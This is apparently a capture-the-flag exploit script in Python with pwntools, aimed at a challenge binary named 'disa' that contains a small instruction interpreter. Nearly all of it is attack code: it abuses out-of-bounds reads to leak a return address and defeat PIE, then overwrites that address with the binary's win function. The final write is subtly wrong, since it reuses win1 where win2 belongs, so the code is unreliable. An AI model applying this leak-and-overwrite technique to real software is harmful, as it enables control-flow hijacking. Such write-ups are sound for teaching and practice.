#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("disa")

gs = '''
b *interpreter+147
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
        return remote("address", 12345)
    else:
        return process(elf.path)

# Addresses

# Functions
def set_dat(value: int):
    io.sendline(b"PUT 0") # Start by setting dat = 0
    while value > 0:
        if value > 4000:
            io.sendline(b"PUT 4000")
            io.sendline(b"ADD")
            value = value - 4000
        else:
            io.sendline(b"PUT " + str(value).encode())
            io.sendline(b"ADD")
            value = value - value

def set_cell(index: int, value: int):
    io.sendline(b"PUT 0") # Start by setting dat = 0
    io.sendline(b"PUT " + str(index).encode()) # set dat = index_val
    io.sendline(b"JMP") # set addr = dat = index_val
    io.sendline(b"PUT 0") # reset dat = 0
    io.sendline(b"ST") # set cell[index_val] = 0

    # Now we can start incrementing the value at index_val
    set_dat(value) # dat = value
    io.sendline(b"ST") # set cell[index_val] = value
    

io = start()

io.sendlineafter(b"program:", b"PUT 4000")
io.sendline(b"ADD")
io.sendline(b"ADD")
io.sendline(b"PUT 212")
io.sendline(b"ADD") # cells[0] = 8212
io.sendline(b"LD") # dat = 8212
io.sendline(b"JMP") # addr = dat = 8212
io.sendline(b"LD") # dat = cells[8212]
io.sendline(b"RD") # print dat

# We will recv 2 bytes at a time from the return address
print(io.recvline())
pie0 = int(io.recvline(timeout=1).strip(), 10) # base 10 since it is printed as a decimal integer
log.info("pie0: %s" % hex(pie0))

# Set dat = 1 and then add it to addr so we can read the next index: cells[8213]
io.sendline(b"PUT 0") # dat = 0
io.sendline(b"JMP") # addr = dat = 0
io.sendline(b"PUT 1") # dat = 1 
io.sendline(b"ADD") # cells[0] += 1 and since cells[0] contains 8212 it is now 8213
io.sendline(b"LD") # dat = 8213
io.sendline(b"JMP") # addr = dat = 8213
io.sendline(b"LD") # dat = cells[8213]
io.sendline(b"RD") # print dat

# recv pie1
pie1 = int(io.recvline(timeout=1).strip(), 10)
log.info("pie1: %s" % hex(pie1))

# Set dat = 1 and then add it to addr so we can read the next index: cells[8214]
io.sendline(b"PUT 0") # dat = 0
io.sendline(b"JMP") # addr = dat = 0
io.sendline(b"PUT 1") # dat = 1 
io.sendline(b"ADD") # cells[0] += 1 and since cells[0] contains 8212 it is now 8214
io.sendline(b"LD") # dat = 8214
io.sendline(b"JMP") # addr = dat = 8214
io.sendline(b"LD") # dat = cells[8214]
io.sendline(b"RD") # print dat

# recv pie2
pie2 = int(io.recvline(timeout=1).strip(), 10)
log.info("pie2: %s" % hex(pie2))

# Make them info hex and then string to concatenate them
log.info("Bit shifting to make the correct address")
pie0 = pie0 # do nothing, already at correct index
pie1 = pie1 << 16 # move 16 bits is two bytes of 0's meaning 0x0000
pie2 = pie2 << 32 # 32 bits is 4 bytes of 0's meaning 0x00000000
log.info("Pie0: %s" % hex(pie0))
log.info("Pie1: %s" % hex(pie1))
log.info("Pie2: %s" % hex(pie2))
pie_leak = pie0 + pie1 + pie2 # Can also use '|' between them since it is a bitwise or
log.info("Pie leak: %s" % hex(pie_leak))
elf.address = pie_leak - 0x153b # offset to pie base
log.info("Pie base: %s" % hex(elf.address))

# Now we need to overwrite the return address with the win function
win = elf.sym.win
log.info("Win: %s" % hex(win))
win0 = win & 0xFFFF # Now we only have the least significant 4 bytes of the address
win1 = (win & 0xFFFF0000) >> 16 # need it to be the correct value and then convert to 2 byte number
win2 = (win & 0xFFFF00000000) >> 32
log.info("Win0: %s" % hex(win0))
log.info("Win1: %s" % hex(win1))
log.info("Win2: %s" % hex(win2))

# Set cells[index] to be first 2 bytes of ret (from now on ret0)
# To do this we first have to cells[0] = 0
io.sendline(b"PUT 0") # set dat = 0
io.sendline(b"JMP") # set addr = dat = 0
io.sendline(b"ST") # cells[0] = 0

# Start incrementing cells[0] again
io.sendline(b"PUT 4000")
io.sendline(b"ADD")
io.sendline(b"ADD")
io.sendline(b"PUT 212")
io.sendline(b"ADD") # cells[0] = 8212
io.sendline(b"LD") # dat = 8212
io.sendline(b"JMP") # addr = dat = 8212

# Set dat to the correct win0 value
print("Setdat")
set_dat(win0)
io.sendline(b"RD")

# Write dat to cells[8212]
io.sendline(b"ST")

# Increment index of cells[index] to get cells[8213]
io.sendline(b"PUT 0") # dat = 0
io.sendline(b"JMP") # addr = dat = 0
io.sendline(b"PUT 1") # dat = 1 
io.sendline(b"ADD") # cells[0] += 1 and since cells[0] contains 8212 it is now 8213
io.sendline(b"LD") # dat = 8213
io.sendline(b"JMP") # addr = dat = 8213

# Set dat to win1 value
set_dat(win1)

# Write dat to cells[8213]
io.sendline(b"ST")

# Increment index of cells[index] to get cells[8214]
io.sendline(b"PUT 0") # dat = 0
io.sendline(b"JMP") # addr = dat = 0
io.sendline(b"PUT 1") # dat = 1 
io.sendline(b"ADD") # cells[0] += 1 and since cells[0] contains 8212 it is now 8214
io.sendline(b"LD") # dat = 8214
io.sendline(b"JMP") # addr = dat = 8214

# Set dat to win1 value
set_dat(win1)

# Write dat to cells[8214]
io.sendline(b"ST")

# End program in order to terminate the interpreter() function and ret to win
io.sendline(b"END")


        








io.interactive()
